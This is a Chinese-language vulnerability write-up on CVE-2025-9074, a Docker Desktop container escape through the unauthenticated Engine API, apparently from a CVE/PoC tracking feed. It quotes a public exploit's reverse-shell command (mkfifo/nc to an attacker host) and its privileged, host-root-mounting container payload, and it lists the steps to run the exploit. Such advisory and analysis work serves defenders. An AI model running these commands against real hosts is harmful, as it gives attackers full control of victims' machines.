## CVE-2025-9074 - Docker Desktop 容器逃逸/越权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/越权访问

**影响应用:** Docker Desktop

**危害等级:** 严重

**CVSS评分:** 9.3

**影响版本:** Docker Desktop 版本低于 4.44.3 (2025年8月20日修复前)

**利用条件:** 需要本地运行的恶意Linux容器，且能够访问默认子网上的Docker Engine API。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

CVE-2025-9074是一个影响Docker Desktop的容器越权访问漏洞，允许在本地运行的恶意Linux容器绕过隔离机制，通过默认子网（通常是192.168.65.7:2375）直接访问Docker Engine API，而无需任何认证。此漏洞被评为严重级别，CVSS评分高达9.3，其潜在影响是允许攻击者从受控容器中突破沙箱环境，从而完全控制宿主机系统。所提供的POC代码`cve-2025-9074.sh`是一个功能完备的Bash脚本，能够可靠地演示如何利用此漏洞获取宿主机的反向shell。

**POC有效性分析:**
该POC脚本首先通过`curl`命令验证目标Docker Engine API（默认为http://192.168.65.7:2375）是否可达。一旦确认API接口可访问，脚本便会精心构造一个JSON格式的Docker容器创建请求负载。这个负载是漏洞成功利用的核心，它包含了以下关键的恶意配置：
1.  **`Image: "alpine:latest"`**: 利用一个轻量级的Alpine Linux镜像作为恶意容器的基础。
2.  **`Cmd: ["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f"]`**: 这是实现宿主机控制的关键步骤。当容器启动时，此命令会执行一个反向shell，通过`netcat`连接回攻击者预先设置的指定IP和端口。
3.  **`HostConfig.Binds: ["/:/hostfs:rw"]`**: 这一配置至关重要，它将宿主机的根文件系统（`/`）以读写权限挂载到容器内的`/hostfs`目录。这使得容器能够直接访问和修改宿主机上的所有文件。
4.  **`HostConfig.Privileged: true`**: 将容器设置为特权模式。在特权模式下，容器获得了宿主机的所有权限和能力，能够访问所有设备，执行更高级别的系统操作，从而有效绕过标准的容器隔离机制。
5.  **`HostConfig.NetworkMode: "host"`**: 将容器的网络模式设置为宿主模式。这意味着容器将共享宿主机的网络命名空间，可以直接使用宿主机的网络接口，这对于反向shell的成功建立和通信至关重要。

脚本随后使用`curl`命令向Docker Engine API发送`POST`请求，以创建并启动带有这些恶意配置的新容器。一旦容器成功启动，其内部的反向shell命令将被执行，并尝试连接回攻击者在远程机器上设置的监听器。如果连接成功，攻击者便可获得宿主机的交互式shell访问权限，从而实现对整个宿主机系统的全面控制。综上所述，该POC代码设计巧妙，充分利用了Docker Desktop中Docker Engine API的未授权访问缺陷，并通过特权容器、宿主机文件系统挂载和宿主机网络模式等技术，成功实现了从容器内部到宿主机的全面逃逸，是验证CVE-2025-9074漏洞有效性的一个高度可用和完整的利用示例。

**利用步骤:**
1.  **初始访问**: 攻击者首先需在运行Docker Desktop的Windows或macOS系统上，通过某种方式（例如，运行一个被控制的恶意镜像或通过其他漏洞）获得一个本地Linux容器的执行权限。
2.  **设置监听**: 攻击者在其控制的远程服务器上启动一个`netcat`监听器，等待反向shell连接。例如，在攻击机上执行命令：`nc -lvnp <监听端口>` (如 `nc -lvnp 4444`)。
3.  **执行POC**: 从受感染的本地容器内部，执行提供的POC脚本`cve-2025-9074.sh`。执行时需提供目标Docker Engine API的IP地址（默认为192.168.65.7）、端口（默认为2375）、攻击者的IP地址以及`netcat`监听端口。命令示例：`./cve-2025-9074.sh 192.168.65.7 2375 <攻击者IP> <监听端口>`。
4.  **API访问验证**: POC脚本首先会向Docker Engine API的`/version`端点发送请求，确认API可达。
5.  **创建恶意容器**: 脚本将构建一个JSON请求体，其中包含创建恶意容器所需的配置（反向shell命令、宿主机根目录挂载、特权模式、宿主机网络模式）。
6.  **发送请求**: `curl`命令将此恶意请求发送至`http://192.168.65.7:2375/containers/create`，通知Docker Engine API创建并启动容器。
7.  **反向Shell建立**: 新启动的恶意容器会执行其内部的`Cmd`指令，即启动反向shell并尝试连接回攻击者在步骤2中设置的监听器。
8.  **宿主机控制**: 一旦`netcat`连接建立成功，攻击者即可通过其监听器获得宿主机的交互式shell访问权限，从而完全控制目标系统。

**投毒风险分析:**
此POC代码的投毒风险被评估为极低（10%）。这种评估是基于对其源代码的全面审查和分析。该POC代码`cve-2025-9074.sh`是一个简洁明了的Bash脚本，其所有功能都围绕着利用CVE-2025-9074漏洞展开，即通过Docker Engine API创建一个恶意容器以获取反向shell。

代码中没有发现任何试图进行混淆、加密或使用复杂技术来隐藏其真实意图的行为。所有命令和操作都清晰可见，并且完全符合漏洞利用的预期逻辑。例如，脚本使用了标准的`echo`、`cat`、`grep`、`cut`等Bash工具，以及广泛使用的`curl`工具进行HTTP请求。用于创建恶意容器的JSON负载也是直接在脚本中以可读的方式定义的，并且其内容完全服务于漏洞利用，包括挂载宿主机文件系统和启动反向shell等，这些都是POC为了演示漏洞效果而采取的必要步骤。

此外，该POC没有包含任何下载外部可执行文件、向第三方服务器发送敏感数据、修改用户系统配置或执行其他未经授权的后台操作的代码。其唯一的“恶意”行为是建立一个反向shell连接，但这正是POC所要演示的漏洞利用结果，属于预期行为，而非POC代码本身附带的额外恶意功能。项目`README.md`文件中明确包含了法律免责声明，强调其仅用于教育和授权的安全测试目的，并警告了未经授权利用的法律后果。这进一步表明了作者的意图是提供一个负责任的测试工具，而非恶意软件。因此，用户在授权的环境中正确使用此POC时，主要风险在于其在测试环境中的预期影响（即对目标Docker Desktop宿主机的控制权获取），而不是POC代码自身包含的、意图之外的恶意负载或投毒行为。在授权的环境中正确使用，该POC是安全的，不会引入额外的投毒风险。

**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=2025-9074
